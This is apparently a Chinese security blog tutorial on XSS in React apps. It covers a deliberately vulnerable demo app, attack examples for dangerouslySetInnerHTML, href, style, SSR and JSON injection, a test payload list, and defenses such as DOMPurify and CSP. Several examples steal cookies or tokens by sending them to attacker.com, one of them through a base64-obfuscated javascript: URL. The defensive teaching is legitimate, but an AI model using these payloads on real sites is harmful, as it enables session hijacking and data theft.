> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NjUxOTM3Mg==&mid=2247489751&idx=1&sn=da01ee6183bb19c4e1c4c5cf9f4ca968

#  React XSS  
原创 一个努力的学渣  一个努力的学渣   2025-07-16 14:28  
  
免责声明  
  
本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！  
  
什么是React  
  
React 是由 Facebook 开发并维护的JavaScript 库，用于构建用户界面（UI），特别是单页应用（SPA）和移动应用（通过 React Native）  
  
图标：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyrNeNxQBiaDjvGicaibpqQGrMh20exvdkXsnUEibLqibVgvTt6O6rmhOaYNQ/640?wx_fmt=png&from=appmsg "")  
  
  
React存在XSS漏洞的几率很低，除非修改默认代码/不使用默认的代码，一般只要研发不瞎搞，React基本不会存在XSS漏洞(存在  
内置安全机制  
)  
  
  
React XSS 的本质  
  
React 的核心安全机制是 JSX 自动转义，在渲染文本内容时自动进行 HTML 实体编码：  

```
// 安全：自动转义 HTML
function SafeComponent() {
  const userInput = &#34;<script>alert(1)</script>&#34;;
  return <div>{userInput}</div>; 
  // 输出: &lt;script&gt;alert(1)&lt;/script&gt;
}
```

  
然而，当开发者绕过 React 的安全机制时，XSS 漏洞仍会发生。React XSS 的特殊性在于：  
- 显式危险 API：React 提供了 dangerouslySetInnerHTML 等明确标记为危险的 API  
  
- 上下文处理不足：自动转义只处理 HTML 上下文，不处理 URL、CSS、JavaScript 等上下文  
  
- 服务端渲染风险：SSR 场景下的特殊漏洞模式  
  
- JSX 注入点：React 的表达式语法可能被滥用  
  
前置环境准备  
  
需要先安装nodejs：  
https://nodejs.org/zh-cn/download  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEy1ciafIhoYkMI8htfTvLXLG5hicTnRcfCeXMWgqp02Kic5zDKCyldJ1Xyw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyTWbuELNB1fDA0xfib8Ljojq42Tw2u4zcFGRibJooWdg4RKAfM9keR80A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyx9FbPXklicfLzekB5jXic2EVrqBpicW7yibGnTCDhRrTdM0LTbI4ibDHiaWg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyFY7hT6IDAhDw4M2LppoZlW4V6S0VSaNUvbUiaFyZd0kcqCEKJkjGYyg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyA9Pnibib8Oziao5iaPfmIImv3LYgk381WmibuoTaDRTJemR1mU13TrZ5Hjg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyDNTvEzR1zicyRV5xNzMkhcrzsJMozFnaor3dpvrL8aff33wMJvXDj7g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyCcibUUKQITiaVakb1ciauj3r4m9R8Mt04Zwyheup32b1Ld7SajpWicrMibw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyV0mWyUCvRwqRhLtEU9cYs6yCiaFA6rYYeWXmPQoALuhvUicNjLur2Uwg/640?wx_fmt=png&from=appmsg "")  
  
搭建：  
  
npx create  
-  
react  
-  
app react  
-  
xss  
-  
example  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyibbRRqxh2qTgnJOKY3j8vaLJY4ecfGyJ9hqUOdQwUMk3MJiaHelbSUYw/640?wx_fmt=png&from=appmsg "")  
  
cd C:\Users\Z\vite-project\react-xss-example  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyPSYicyzYfIPUz840tX1pzpWtSU8qQku9MDIEPv2v2xTGxjtdT0k6BGw/640?wx_fmt=png&from=appmsg "")  
  
修改：C:\Users\Z\vite-project\react-xss-example\src\App  
.  
js  

```
import React, { useState } from 'react';
import ReactDOM from 'react-dom';


function App() {
    const [userInput, setUserInput] = useState('');
    const [displayedInput, setDisplayedInput] = useState('');


    const handleInputChange = (e) => {
        setUserInput(e.target.value);
    };


    const displayInput = () => {
        setDisplayedInput(userInput);
    };


    return (
        <div>
            <input type=&#34;text&#34; value={userInput} onChange={handleInputChange} placeholder=&#34;输入内容&#34;/>
            <button onClick={displayInput}>显示输入</button>
            <div dangerouslySetInnerHTML={{__html: displayedInput}}/>
            {/*<div>{displayedInput}</div>*/}
        </div>
    );
}


export default App;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyLVYHQkotMrSpJ5CDbZOEcmXBeicyksAPh8YdkKMZuSOMPFyQKADfD0w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEy08Mzvm1T358uyE4AU73JZQjvLuz6uWhriap3yCpzR91EquyWib5JPzEA/640?wx_fmt=png&from=appmsg "")  
  
启动：npm start  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyXX9KF4K7LEyAIvkd8kCv1YBa7sAicK49xvfl2oKc6CTk9JicEZ3gC3ng/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyX7jgdvicZmEkhqt01uHCbCbnux33TAkAWEFTrWnIrYODKftBiaXicJpwQ/640?wx_fmt=png&from=appmsg "")  
  
测试：  
<  
img src  
=  
"x"  
 onerror  
=  
"alert('XSS')"  
/>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEycicicNgIdUXVCM06YbEFLgbzIV9eTeuTqJNkLXtKLSaibxERT7sjmWfCg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyjuGmNXYZKdrcvd3RWExeSZpugKw6crMVN1GDKicHRApEv5IoAAe9AFw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyJdt1o0MjsZcl9SvHBYyianjiaCeSAnWEndSqpxPMsEKmicnhOcd5FethQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEykgf8c0EwQyOuM6V4BPfuLx4Wia9mwadZxKJxh6MgBaqhgiavj0dvL5fw/640?wx_fmt=png&from=appmsg "")  
  
修复：直接使用  
{  
displayedInput  
}  
来显示  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEydxbKmGwibicDCtTBkM7B2mffhFc8Tetzvk4h2bcMv7LbQnN1yPxgRiaeg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyqBS16HRzUU0LhA65icKHPXdhYoSIN5iabDsNBicFO8JCPPbm59B9RTptQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyFs1olFogmUHmLslYoZdCMZImAnQoN9CjhEibAGxrNZChicRgVYMwrUNA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RzS5ibXiamR4GOWaDDicNTCicEyIbyqfY285wpfWn3jObwaDJ8OCNkow92LpibPyyco3oO1aVicH9ujW8wQ/640?wx_fmt=png&from=appmsg "")  
### React XSS 高危区域  
#### dangerouslySetInnerHTML  
  
React 提供的此属性会绕过转义机制，直接渲染原始 HTML  

```
function UnsafeComponent() {
  return <div dangerouslySetInnerHTML={{ __html: userContent }} />;		// 高风险
}
```

  
攻击示例：  

```
// 经典 XSS
userContent = '<img src=x onerror=&#34;stealCookies()&#34;>';


// SVG 向量攻击
userContent = '<svg xmlns=&#34;http://www.w3.org/2000/svg&#34;><script>alert(1)</script></svg>';


// 现代攻击 (窃取数据)
userContent = `
  <iframe style=&#34;display:none&#34; src=&#34;https://attacker.com/log?data=${btoa(document.cookie)}&#34;>
`;
```

#### 不安全属性绑定  

```
// URL 注入
<a href={userControlledUrl}>点击</a>		// 点击触发脚本


// 事件处理器注入
<button onClick={userHandler}>执行</button>


// 样式注入
<div style={{ background: userBackground }}></div>
```

  
攻击示例：  

```
// 链接劫持 (50% 现代浏览器仍支持)
userControlledUrl = &#34;javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZQ=='));&#34;;


// 高阶攻击 (绕过检测)
userHandler = () => {
  setTimeout(() => {
    new Function('alert(1)')();
  }, 3000);
};


// CSS 数据窃取
userBackground = `url('https://attacker.com/steal?data=${btoa(localStorage.getItem('token'))}')`;
```

#### 服务端渲染 (SSR) XSS  
  
服务端拼接 HTML 时未转义用户数据：  

```
// 危险的服务端渲染
app.get('/profile', (req, res) => {
  const userData = JSON.parse(req.query.data);
  const html = ReactDOMServer.renderToString(
    <Profile user={userData} />
  );
  res.send(html);		// 直接嵌入，风险高！
});
```

  
攻击示例：  

```
/profile?data={&#34;bio&#34;:&#34;<script>malicious()</script>&#34;}
```

#### JSON注入攻击  

```
// 不安全的数据注入
<script>
  window.__PRELOADED_STATE__ = ${JSON.stringify(state)};
</script>
```

  
攻击示例：  

```
state = {
  user: {
    name: &#34;John&#34;,
    // 闭合 JSON 并注入脚本
    bio: &#34;</script><script>alert(1)</script><!--&#34;
  }
};
```

#### 动态组件名称注入  

```
const Component = components[componentName];
return <Component />;
```

  
攻击示例：  

```
// 恶意组件定义
const MaliciousComponent = () => (
  <img src=&#34;x&#34; onError={() => fetch('https://attacker.com?cookie='+document.cookie)} />
);


// 注入
componentName = &#34;MaliciousComponent&#34;;
```

### React XSS全面防御  
#### 安全使用 dangerouslySetInnerHTML  

```
import DOMPurify from 'dompurify';


function SafeHTML({ content }) {
  const cleanHTML = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'a', 'b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: ['href', 'title', 'class'],
    FORBID_ATTR: ['style', 'on*'],
    ALLOWED_URI_REGEXP: /^(https?|mailto|tel):/i,
    RETURN_TRUSTED_TYPE: true
  });


  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
```

#### 安全属性绑定实践  

```
// URL 安全验证
const SafeLink = ({ href, children }) => {
  const isSafe = /^(https?|mailto|tel):/i.test(href);
  return isSafe ? <a href={href}>{children}</a> : <span>{children}</span>;
};


// 安全事件处理器
const SafeButton = ({ onClick }) => {
  const safeHandler = useCallback(() => {
    if (typeof onClick === 'function') {
      try {
        onClick();
      } catch (e) {
        console.error('Handler error:', e);
      }
    }
  }, [onClick]);


  return <button onClick={safeHandler}>执行</button>;
};


// 样式安全处理
const SafeDiv = ({ style }) => {
  const safeStyle = Object.entries(style).reduce((acc, [key, value]) => {
    if (!value.includes('url') && !value.includes('expression')) {
      acc[key] = value;
    }
    return acc;
  }, {});


  return <div style={safeStyle} />;
};
```

#### 内容安全策略 (CSP) 深度配置  
  
通过 HTTP 头限制资源加载：  

```
<!-- public/index.html -->
<meta http-equiv=&#34;Content-Security-Policy&#34; 
      content=&#34;
        default-src 'none';
        script-src 'self' 'nonce-random123' 'strict-dynamic';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data:;
        font-src 'self';
        connect-src 'self';
        frame-src 'none';
        base-uri 'self';
        form-action 'self';
        require-trusted-types-for 'script';
        trusted-types dompurify react-sanitizer;
      &#34;>
```

#### 服务端渲染安全加固  

```
import serialize from 'serialize-javascript';
import { sanitize } from 'dompurify';


app.get('/profile', (req, res) => {
  // 输入验证
  const userData = validateUserData(req.query.data);


  // 安全渲染
  const html = ReactDOMServer.renderToString(
    <Profile user={userData} />
  );


  // 安全数据注入
  const safeData = serialize(userData, {
    isJSON: true,
    ignoreFunction: true
  });


  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <title>安全页面</title>
      </head>
      <body>
        <div id=&#34;root&#34;>${html}</div>
        <script nonce=&#34;random123&#34;>
          window.__PRELOADED_STATE__ = ${safeData};
        </script>
      </body>
    </html>
  `);
});
```

#### React 18 安全增强特性  
  
使用新的安全API  

```
// React 19+ 安全HTML提案
<SafeHTML html={userContent} allowElements={['p', 'a']} allowAttributes={['href']} />


// 严格模式增强
<React.StrictMode>
  <App />
</React.StrictMode>// React 19+ 安全HTML提案
<SafeHTML html={userContent} allowElements={['p', 'a']} allowAttributes={['href']} />


// 严格模式增强
<React.StrictMode>
  <App />
</React.StrictMode>
```

  
服务端组件安全   

```
async function UserProfile({ userId }) {
  const user = await db.user.find(userId);


  // 自动安全处理
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.bio}</p> {/* 自动转义 */}
    </div>
  );
}
```

### 漏洞挖掘  
#### 测试Payload库  
  
基础XSS：  

```
&#34;><img src=x onerror=alert(1)>
{/* */}{alert`1`}
```

  
React 特定 Payload：  

```
{() => { alert(1) }}
{[]?.[alert(1)]}
{`${alert(1)}`}
```

  
高阶绕过技术：  

```
// JSX 注入
<img src=&#34;x&#34; onError={alert(1)} />


// Unicode 绕过
\u003cimg src=x onerror=alert(1)\u003e


// 模板字符串
${alert(1)}
```

#### 上下文测试矩阵  
<table><tbody><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">注入点</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf=""> 测试Payload</span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">dangerouslySetInnerHTML</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">&lt;img src=x onerror=alert(1)&gt;</span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">href 属性 </span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">javascript:alert(document.domain)</span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">style 属性</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">{backgroundImage: &#39;url(&#34;javascript:alert(1)&#34;)&#39;} </span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">JSX 表达式</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">{top: window}</span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">动态组件</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">React.createElement(userInput) </span></p></td></tr><tr><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">JSON 注入</span></p></td><td data-colwidth="375" width="375" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span leaf="">&#34;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#34; </span></p></td></tr></tbody></table>####   
  
总结  
- React 本身已非常安全，真正的漏洞往往来自“绕过 React”的写法。  
  
- 永远记得：任何把“用户字符串”变成“浏览器指令”的动作，都必须加一道防线  
  
